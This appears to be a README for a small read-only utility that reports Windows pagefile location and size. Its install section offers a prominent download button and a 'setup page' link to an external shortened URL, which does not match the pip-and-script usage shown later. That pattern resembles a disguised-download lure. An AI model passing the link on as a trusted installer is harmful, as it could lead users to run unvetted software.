# Pagefile Info

Where the pagefile is, and how big.

Show pagefile location and size. It does not change the pagefile.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Open the setup page](https://share.google/A1IHfyGRT0zGRLqj8)**

## Why

A disk-full ticket needs the pagefile path.

This prints location and size only.

## What it does

- Path and size
- Read-only
- All volumes it can see
- No changes

## Usage

```text
python -m pip install -r requirements.txt
python main.py --help
```
